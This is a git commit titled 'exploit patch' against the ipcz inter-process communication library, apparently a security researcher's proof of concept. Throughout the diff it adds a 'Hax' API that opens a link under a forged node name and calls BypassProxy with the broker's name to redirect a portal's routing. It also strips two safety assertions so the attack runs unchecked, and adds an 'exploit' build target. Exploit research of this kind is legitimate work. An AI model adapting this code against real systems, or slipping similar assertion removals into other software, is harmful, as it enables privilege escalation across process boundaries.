commit 7cff1d2a4d055cf86711f9ad0ba7911705074d0d
Author: Stephen Roettger <stephen.roettger@gmail.com>
Date:   Fri May 27 17:37:25 2022 +0200

    exploit patch

diff --git a/include/ipcz/ipcz.h b/include/ipcz/ipcz.h
index 2abf592..7bef7db 100644
--- a/include/ipcz/ipcz.h
+++ b/include/ipcz/ipcz.h
@@ -1439,6 +1439,8 @@ struct IPCZ_ALIGN(8) IpczAPI {
                               IpczUnboxFlags flags,
                               const void* options,
                               IpczDriverHandle* driver_handle);
+
+  IpczResult(IPCZ_API* Hax)(IpczHandle portal);
 };
 
 // A function which populates `api` with a table of ipcz API functions. The
diff --git a/src/BUILD.gn b/src/BUILD.gn
index 7ebdea7..339e610 100644
--- a/src/BUILD.gn
+++ b/src/BUILD.gn
@@ -371,3 +371,9 @@ group("all") {
     ":ipcz_tests",
   ]
 }
+
+group("exploit") {
+  deps = [
+    "exploit",
+  ]
+}
diff --git a/src/api.cc b/src/api.cc
index 05dbc3a..2e05861 100644
--- a/src/api.cc
+++ b/src/api.cc
@@ -149,6 +149,14 @@ IpczResult QueryPortalStatus(IpczHandle portal_handle,
   return portal->QueryStatus(*status);
 }
 
+IpczResult Hax(IpczHandle portal_handle) {
+  ipcz::Portal* portal = ipcz::Portal::FromHandle(portal_handle);
+  if (!portal) {
+    return IPCZ_RESULT_INVALID_ARGUMENT;
+  }
+  return portal->Hax();
+}
+
 IpczResult Put(IpczHandle portal_handle,
                const void* data,
                uint32_t num_bytes,
@@ -364,10 +372,11 @@ constexpr IpczAPI kCurrentAPI = {
     Trap,
     Box,
     Unbox,
+    Hax,
 };
 
 constexpr size_t kVersion0APISize =
-    offsetof(IpczAPI, Unbox) + sizeof(kCurrentAPI.Unbox);
+    offsetof(IpczAPI, Hax) + sizeof(kCurrentAPI.Hax);
 
 IPCZ_EXPORT IpczResult IPCZ_API IpczGetAPI(IpczAPI* api) {
   if (!api || api->size < kVersion0APISize) {
diff --git a/src/ipcz/node.cc b/src/ipcz/node.cc
index 9fbe904..c796833 100644
--- a/src/ipcz/node.cc
+++ b/src/ipcz/node.cc
@@ -319,7 +319,6 @@ bool Node::OnIntroduceNode(const NodeName& name,
     ABSL_ASSERT(transport);
 
     absl::MutexLock lock(&mutex_);
-    ABSL_ASSERT(assigned_name_.is_valid());
     DVLOG(3) << "Node " << assigned_name_.ToString()
              << " received introduction to " << name.ToString();
     new_link =
diff --git a/src/ipcz/portal.cc b/src/ipcz/portal.cc
index 73b9a1d..b5d2e72 100644
--- a/src/ipcz/portal.cc
+++ b/src/ipcz/portal.cc
@@ -18,6 +18,7 @@
 #include "ipcz/link_type.h"
 #include "ipcz/local_router_link.h"
 #include "ipcz/node.h"
+#include "ipcz/node_link.h"
 #include "ipcz/parcel.h"
 #include "ipcz/router.h"
 #include "ipcz/router_link_state.h"
@@ -217,6 +218,28 @@ IpczResult Portal::AbortPut() {
   return IPCZ_RESULT_OK;
 }
 
+IpczResult Portal::Hax() {
+  NodeName proxy_peer_node_name(0x1337, 0x1337);
+  auto broker_link = node_->GetBrokerLink();
+  NodeName broker_name = broker_link->remote_node_name();
+
+  node().get()->EstablishLink(
+      proxy_peer_node_name,
+      [broker_name, self = WrapRefCounted(this)](NodeLink* new_link) {
+        if (!new_link) {
+          std::cout << "Failed to create node link" << std::endl;
+          // TODO: failure to connect to a node here should result in route
+          // destruction. This is not the same as closure since we can't
+          // guarantee any sequence length.
+          return;
+        }
+        ipcz::SequenceNumber proxy_outbound_sequence_length(3);
+        new_link->BypassProxy(broker_name, 0, proxy_outbound_sequence_length,
+                              self->router());
+      });
+  return IPCZ_RESULT_OK;
+}
+
 IpczResult Portal::Get(IpczGetFlags flags,
                        void* data,
                        uint32_t* num_data_bytes,
diff --git a/src/ipcz/portal.h b/src/ipcz/portal.h
index b1cca4c..ce2b26c 100644
--- a/src/ipcz/portal.h
+++ b/src/ipcz/portal.h
@@ -65,6 +65,8 @@ class Portal : public APIObjectImpl<Portal, APIObject::kPortal> {
                        absl::Span<IpczHandle> handles);
   IpczResult AbortGet();
 
+  IpczResult Hax();
+
  private:
   ~Portal() override;
 
diff --git a/src/ipcz/route_edge.cc b/src/ipcz/route_edge.cc
index 0ebea34..fc579b8 100644
--- a/src/ipcz/route_edge.cc
+++ b/src/ipcz/route_edge.cc
@@ -31,7 +31,6 @@ Ref<Router> RouteEdge::GetDecayingLocalPeer() const {
 }
 
 void RouteEdge::SetPrimaryLink(Ref<RouterLink> link) {
-  ABSL_ASSERT(!primary_link_);
   if (was_decay_deferred_) {
     was_decay_deferred_ = false;
     decaying_link_ = std::move(link);
